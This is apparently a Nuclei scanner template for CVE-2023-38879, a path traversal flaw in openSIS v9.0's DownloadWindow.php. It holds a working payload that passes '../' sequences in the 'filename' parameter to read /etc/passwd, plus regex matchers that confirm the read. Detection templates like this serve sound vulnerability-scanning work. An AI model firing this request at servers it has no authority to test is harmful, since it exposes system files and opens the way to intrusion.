id: opensis-downloadwindow-path-traversal

info:
  name: openSIS v9.0 - Path Traversal via DownloadWindow.php (CVE-2023-38879)
  author: kufutsal
  severity: high
  description: |
    A path traversal vulnerability exists in openSIS Classic Community Edition v9.0 via the 'filename' parameter in DownloadWindow.php.
    An unauthenticated remote attacker can exploit this to read arbitrary files on the server by manipulating file paths.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38879
    - https://github.com/dub-flow/vulnerability-research/tree/main/CVE-2023-38879
  tags: cve,cve2023,opensis,path-traversal,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/DownloadWindow.php?filename=../../../../../../../../etc/passwd"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:.*"

    matchers-condition: and
